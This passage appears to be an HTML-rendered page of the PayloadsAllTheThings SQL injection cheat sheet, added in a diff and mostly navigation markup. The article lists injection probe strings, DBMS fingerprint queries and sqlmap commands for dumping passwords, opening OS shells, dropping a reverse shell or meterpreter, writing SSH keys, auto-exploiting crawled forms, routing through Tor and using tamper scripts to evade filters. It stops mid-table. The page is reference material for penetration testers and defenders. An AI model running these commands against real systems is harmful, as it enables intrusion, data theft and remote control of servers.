+      
+      
+      
+        <label class="md-nav__link" for="__nav_42">
+          Upload Insecure Files
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Upload Insecure Files" data-md-level="1">
+        <label class="md-nav__title" for="__nav_42">
+          <span class="md-nav__icon md-icon"></span>
+          Upload Insecure Files
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/" class="md-nav__link">
+        Upload
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_2" type="checkbox" id="__nav_42_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_2">
+          CVE Ffmpeg HLS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CVE Ffmpeg HLS" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_2">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Ffmpeg HLS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/" class="md-nav__link">
+        FFmpeg HLS vulnerability
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_3" type="checkbox" id="__nav_42_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_3">
+          Configuration Apache .htaccess
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Configuration Apache .htaccess" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_3">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Apache .htaccess
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/" class="md-nav__link">
+        .htaccess upload
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_4" type="checkbox" id="__nav_42_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_4">
+          Configuration Busybox httpd.conf
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Configuration Busybox httpd.conf" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_4">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Busybox httpd.conf
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_5" type="checkbox" id="__nav_42_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_5">
+          Extension Flash
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Extension Flash" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_5">
+          <span class="md-nav__icon md-icon"></span>
+          Extension Flash
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Extension%20Flash/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_6" type="checkbox" id="__nav_42_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_6">
+          Picture Image Magik
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Picture Image Magik" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_6">
+          <span class="md-nav__icon md-icon"></span>
+          Picture Image Magik
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Picture%20Image%20Magik/" class="md-nav__link">
+        Image Tragik 1 & 2
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_7" type="checkbox" id="__nav_42_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_7">
+          Zip Slip
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Zip Slip" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_7">
+          <span class="md-nav__icon md-icon"></span>
+          Zip Slip
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Zip%20Slip/" class="md-nav__link">
+        Zip Slip
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_43" type="checkbox" id="__nav_43" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_43">
+          Web Cache Deception
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web Cache Deception" data-md-level="1">
+        <label class="md-nav__title" for="__nav_43">
+          <span class="md-nav__icon md-icon"></span>
+          Web Cache Deception
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20Cache%20Deception/" class="md-nav__link">
+        Web Cache Deception Attack
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_44" type="checkbox" id="__nav_44" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_44">
+          Web Sockets
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web Sockets" data-md-level="1">
+        <label class="md-nav__title" for="__nav_44">
+          <span class="md-nav__icon md-icon"></span>
+          Web Sockets
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20Sockets/" class="md-nav__link">
+        Web Sockets Attacks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_45" type="checkbox" id="__nav_45" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_45">
+          XPATH Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XPATH Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_45">
+          <span class="md-nav__icon md-icon"></span>
+          XPATH Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XPATH%20Injection/" class="md-nav__link">
+        XPATH injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_46" type="checkbox" id="__nav_46" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_46">
+          XSLT Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XSLT Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_46">
+          <span class="md-nav__icon md-icon"></span>
+          XSLT Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSLT%20Injection/" class="md-nav__link">
+        XSLT Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_47" type="checkbox" id="__nav_47" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_47">
+          XSS Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XSS Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_47">
+          <span class="md-nav__icon md-icon"></span>
+          XSS Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS%20Injection/" class="md-nav__link">
+        Cross Site Scripting
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS%20Injection/XSS%20in%20Angular/" class="md-nav__link">
+        XSS in Angular and AngularJS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/" class="md-nav__link">
+        XSS with Relative Path Overwrite - IE 8/9 and lower
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_48" type="checkbox" id="__nav_48" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48">
+          XXE Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XXE Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_48">
+          <span class="md-nav__icon md-icon"></span>
+          XXE Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XXE%20Injection/" class="md-nav__link">
+        XML External Entity
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_49" type="checkbox" id="__nav_49" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_49">
+           template vuln
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label=" template vuln" data-md-level="1">
+        <label class="md-nav__title" for="__nav_49">
+          <span class="md-nav__icon md-icon"></span>
+           template vuln
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../_template_vuln/" class="md-nav__link">
+        Vulnerability Title
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#entry-point-detection" class="md-nav__link">
+    Entry point detection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dbms-identification" class="md-nav__link">
+    DBMS Identification
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection-using-sqlmap" class="md-nav__link">
+    SQL injection using SQLmap
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL injection using SQLmap">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-arguments-for-sqlmap" class="md-nav__link">
+    Basic arguments for SQLmap
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#load-a-request-file-and-use-mobile-user-agent" class="md-nav__link">
+    Load a request file and use mobile user-agent
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#custom-injection-in-useragentheaderreferercookie" class="md-nav__link">
+    Custom injection in UserAgent/Header/Referer/Cookie
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#second-order-injection" class="md-nav__link">
+    Second order injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    Shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#crawl-a-website-with-sqlmap-and-auto-exploit" class="md-nav__link">
+    Crawl a website with SQLmap and auto-exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-tor-with-sqlmap" class="md-nav__link">
+    Using TOR with SQLmap
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-a-proxy-with-sqlmap" class="md-nav__link">
+    Using a proxy with SQLmap
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-chrome-cookie-and-a-proxy" class="md-nav__link">
+    Using Chrome cookie and a Proxy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-suffix-to-tamper-the-injection" class="md-nav__link">
+    Using suffix to tamper the injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#general-tamper-option-and-tampers-list" class="md-nav__link">
+    General tamper option and tamper's list
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sqlmap-without-sql-injection" class="md-nav__link">
+    SQLmap without SQL injection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication-bypass" class="md-nav__link">
+    Authentication bypass
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication-bypass-raw-md5-sha1" class="md-nav__link">
+    Authentication Bypass (Raw MD5 SHA1)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#polyglot-injection-multicontext" class="md-nav__link">
+    Polyglot injection (multicontext)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#routed-injection" class="md-nav__link">
+    Routed injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#insert-statement-on-duplicate-key-update" class="md-nav__link">
+    Insert Statement - ON DUPLICATE KEY UPDATE
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf-bypass" class="md-nav__link">
+    WAF Bypass
+  </a>
+  
+    <nav class="md-nav" aria-label="WAF Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#white-spaces-alternatives" class="md-nav__link">
+    White spaces alternatives
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#no-comma" class="md-nav__link">
+    No Comma
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#no-equal" class="md-nav__link">
+    No Equal
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#case-modification" class="md-nav__link">
+    Case modification
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obfuscation-by-dbms" class="md-nav__link">
+    Obfuscation by DBMS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#more-mysql-specific" class="md-nav__link">
+    More MySQL specific
+  </a>
+  
+    <nav class="md-nav" aria-label="More MySQL specific">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#waf-bypass-for-mysql-using-scientific-notation" class="md-nav__link">
+    WAF bypass for MySQL using scientific notation
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+  <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/edit/master/SQL Injection/README.md" title="Edit this page" class="md-content__button md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+<h1 id="sql-injection">SQL injection</h1>
+<blockquote>
+<p>A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application.</p>
+</blockquote>
+<p>Attempting to manipulate SQL queries may have goals including:
+- Information Leakage
+- Disclosure of stored data
+- Manipulation of stored data
+- Bypassing authorization controls</p>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md">CheatSheet MSSQL Injection</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md">CheatSheet MySQL Injection</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md">CheatSheet OracleSQL Injection</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md">CheatSheet PostgreSQL Injection</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">CheatSheet SQLite Injection</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md">CheatSheet Cassandra Injection</a></li>
+<li><a href="#entry-point-detection">Entry point detection</a></li>
+<li><a href="#dbms-identification">DBMS Identification</a></li>
+<li><a href="#sql-injection-using-sqlmap">SQL injection using SQLmap</a></li>
+<li><a href="#basic-arguments-for-sqlmap">Basic arguments for SQLmap</a></li>
+<li><a href="#load-a-request-file-and-use-mobile-user-agent">Load a request file and use mobile user-agent</a></li>
+<li><a href="#custom-injection-in-useragentheaderreferercookie">Custom injection in UserAgent/Header/Referer/Cookie</a></li>
+<li><a href="#second-order-injection">Second order injection</a></li>
+<li><a href="#shell">Shell</a></li>
+<li><a href="#crawl-a-website-with-sqlmap-and-auto-exploit">Crawl a website with SQLmap and auto-exploit</a></li>
+<li><a href="#using-tor-with-sqlmap">Using TOR with SQLmap</a></li>
+<li><a href="#using-a-proxy-with-sqlmap">Using a proxy with SQLmap</a></li>
+<li><a href="#using-chrome-cookie-and-a-proxy">Using Chrome cookie and a Proxy</a></li>
+<li><a href="#using-suffix-to-tamper-the-injection">Using suffix to tamper the injection</a></li>
+<li><a href="#general-tamper-option-and-tampers-list">General tamper option and tamper's list</a></li>
+<li><a href="#sqlmap-without-sql-injection">SQLmap without SQL injection</a></li>
+<li><a href="#authentication-bypass">Authentication bypass</a></li>
+<li><a href="#authentication-bypass-raw-md5-sha1">Authentication Bypass (Raw MD5 SHA1)</a></li>
+<li><a href="#polyglot-injection-multicontext">Polyglot injection</a></li>
+<li><a href="#routed-injection">Routed injection</a></li>
+<li><a href="#insert-statement---on-duplicate-key-update">Insert Statement - ON DUPLICATE KEY UPDATE</a></li>
+<li><a href="#waf-bypass">WAF Bypass</a></li>
+</ul>
+<h2 id="entry-point-detection">Entry point detection</h2>
+<p>Detection of an SQL injection entry point
+Simple characters</p>
+<pre><code class="language-sql">'
+%27
+&quot;
+%22
+#
+%23
+;
+%3B
+)
+Wildcard (*)
+&amp;apos;  # required for XML content
+</code></pre>
+<p>Multiple encoding</p>
+<pre><code class="language-sql">%%2727
+%25%27
+</code></pre>
+<p>Merging characters</p>
+<pre><code class="language-sql">`+HERP
+'||'DERP
+'+'herp
+' 'DERP
+'%20'HERP
+'%2B'HERP
+</code></pre>
+<p>Logic Testing</p>
+<pre><code class="language-sql">page.asp?id=1 or 1=1 -- true
+page.asp?id=1' or 1=1 -- true
+page.asp?id=1&quot; or 1=1 -- true
+page.asp?id=1 and 1=2 -- false
+</code></pre>
+<p>Weird characters</p>
+<pre><code class="language-sql">Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
+transformed into U+0022 QUOTATION MARK (&quot;)
+Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
+transformed into U+0027 APOSTROPHE (')
+</code></pre>
+<h2 id="dbms-identification">DBMS Identification</h2>
+<pre><code class="language-c">[&quot;conv('a',16,2)=conv('a',16,2)&quot;                   ,&quot;MYSQL&quot;],
+[&quot;connection_id()=connection_id()&quot;                 ,&quot;MYSQL&quot;],
+[&quot;crc32('MySQL')=crc32('MySQL')&quot;                   ,&quot;MYSQL&quot;],
+[&quot;BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)&quot;       ,&quot;MSSQL&quot;],
+[&quot;@@CONNECTIONS&gt;0&quot;                                 ,&quot;MSSQL&quot;],
+[&quot;@@CONNECTIONS=@@CONNECTIONS&quot;                     ,&quot;MSSQL&quot;],
+[&quot;@@CPU_BUSY=@@CPU_BUSY&quot;                           ,&quot;MSSQL&quot;],
+[&quot;USER_ID(1)=USER_ID(1)&quot;                           ,&quot;MSSQL&quot;],
+[&quot;ROWNUM=ROWNUM&quot;                                   ,&quot;ORACLE&quot;],
+[&quot;RAWTOHEX('AB')=RAWTOHEX('AB')&quot;                   ,&quot;ORACLE&quot;],
+[&quot;LNNVL(0=123)&quot;                                    ,&quot;ORACLE&quot;],
+[&quot;5::int=5&quot;                                        ,&quot;POSTGRESQL&quot;],
+[&quot;5::integer=5&quot;                                    ,&quot;POSTGRESQL&quot;],
+[&quot;pg_client_encoding()=pg_client_encoding()&quot;       ,&quot;POSTGRESQL&quot;],
+[&quot;get_current_ts_config()=get_current_ts_config()&quot; ,&quot;POSTGRESQL&quot;],
+[&quot;quote_literal(42.5)=quote_literal(42.5)&quot;         ,&quot;POSTGRESQL&quot;],
+[&quot;current_database()=current_database()&quot;           ,&quot;POSTGRESQL&quot;],
+[&quot;sqlite_version()=sqlite_version()&quot;               ,&quot;SQLITE&quot;],
+[&quot;last_insert_rowid()&gt;1&quot;                           ,&quot;SQLITE&quot;],
+[&quot;last_insert_rowid()=last_insert_rowid()&quot;         ,&quot;SQLITE&quot;],
+[&quot;val(cvar(1))=1&quot;                                  ,&quot;MSACCESS&quot;],
+[&quot;IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0&quot;               ,&quot;MSACCESS&quot;],
+[&quot;cdbl(1)=cdbl(1)&quot;                                 ,&quot;MSACCESS&quot;],
+[&quot;1337=1337&quot;,   &quot;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&quot;],
+[&quot;'i'='i'&quot;,     &quot;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&quot;],
+</code></pre>
+<h2 id="sql-injection-using-sqlmap">SQL injection using SQLmap</h2>
+<h3 id="basic-arguments-for-sqlmap">Basic arguments for SQLmap</h3>
+<pre><code class="language-powershell">sqlmap --url=&quot;&lt;url&gt;&quot; -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
+</code></pre>
+<h3 id="load-a-request-file-and-use-mobile-user-agent">Load a request file and use mobile user-agent</h3>
+<pre><code class="language-powershell">sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
+</code></pre>
+<h3 id="custom-injection-in-useragentheaderreferercookie">Custom injection in UserAgent/Header/Referer/Cookie</h3>
+<pre><code class="language-powershell">python sqlmap.py -u &quot;http://example.com&quot; --data &quot;username=admin&amp;password=pass&quot;  --headers=&quot;x-forwarded-for:127.0.0.1*&quot;
+The injection is located at the '*'
+</code></pre>
+<h3 id="second-order-injection">Second order injection</h3>
+<pre><code class="language-powershell">python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order &quot;http://targetapp/wishlist&quot; -v 3
+sqlmap -r 1.txt -dbms MySQL -second-order &quot;http://&lt;IP/domain&gt;/joomla/administrator/index.php&quot; -D &quot;joomla&quot; -dbs
+</code></pre>
+<h3 id="shell">Shell</h3>
+<pre><code class="language-powershell">SQL Shell
+python sqlmap.py -u &quot;http://example.com/?id=1&quot;  -p id --sql-shell
+
+Simple Shell
+python sqlmap.py -u &quot;http://example.com/?id=1&quot;  -p id --os-shell
+
+Dropping a reverse-shell / meterpreter
+python sqlmap.py -u &quot;http://example.com/?id=1&quot;  -p id --os-pwn
+
+SSH Shell by dropping an SSH key
+python sqlmap.py -u &quot;http://example.com/?id=1&quot; -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
+</code></pre>
+<h3 id="crawl-a-website-with-sqlmap-and-auto-exploit">Crawl a website with SQLmap and auto-exploit</h3>
+<pre><code class="language-powershell">sqlmap -u &quot;http://example.com/&quot; --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
+
+--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+--crawl = how deep you want to crawl a site
+--forms = Parse and test forms
+</code></pre>
+<h3 id="using-tor-with-sqlmap">Using TOR with SQLmap</h3>
+<pre><code class="language-powershell">sqlmap -u &quot;http://www.target.com&quot; --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
+</code></pre>
+<h3 id="using-a-proxy-with-sqlmap">Using a proxy with SQLmap</h3>
+<pre><code class="language-powershell">sqlmap -u &quot;http://www.target.com&quot; --proxy=&quot;http://127.0.0.1:8080&quot;
+</code></pre>
+<h3 id="using-chrome-cookie-and-a-proxy">Using Chrome cookie and a Proxy</h3>
+<pre><code class="language-powershell">sqlmap -u &quot;https://test.com/index.php?id=99&quot; --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy &quot;http://127.0.0.1:8080&quot;  -f  --time-sec 15 --level 3
+</code></pre>
+<h3 id="using-suffix-to-tamper-the-injection">Using suffix to tamper the injection</h3>
+<pre><code class="language-powershell">python sqlmap.py -u &quot;http://example.com/?id=1&quot;  -p id --suffix=&quot;-- &quot;
+</code></pre>
+<h3 id="general-tamper-option-and-tampers-list">General tamper option and tamper's list</h3>
+<pre><code class="language-powershell">tamper=name_of_the_tamper
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Tamper</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x2char.py</td>
+<td>Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),…) counterpart</td>
+</tr>
+<tr>
+<td>apostrophemask.py</td>
+<td>Replaces apostrophe character with its UTF-8 full width counterpart</td>
+</tr>
+<tr>
+<td>apostrophenullencode.py</td>
+<td>Replaces apostrophe character with its illegal double unicode counterpart</td>
+</tr>
+<tr>
+<td>appendnullbyte.py</td>
+<td>Appends encoded NULL byte character at the end of payload</td>
+</tr>
+<tr>
+<td>base64encode.py</td>
+<td>Base64 all characters in a given payload</td>
+</tr>
+<tr>
+<td>between.py</td>
+<td>Replaces greater than operator ('&gt;') with 'NOT BETWEEN 0 AND #'</td>
+</tr>
+<tr>
+<td>bluecoat.py</td>
+<td>Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator</td>
+</tr>
+<tr>
+<td>chardoubleencode.py</td>
+<td>Double url-encodes all characters in a given payload (not processing already encoded)</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td>URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %53%45%4C%45%43%54)</td>
+</tr>
+<tr>
+<td>charunicodeencode.py</td>
+<td>Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054)</td>
+</tr>
+<tr>
+<td>charunicodeescape.py</td>
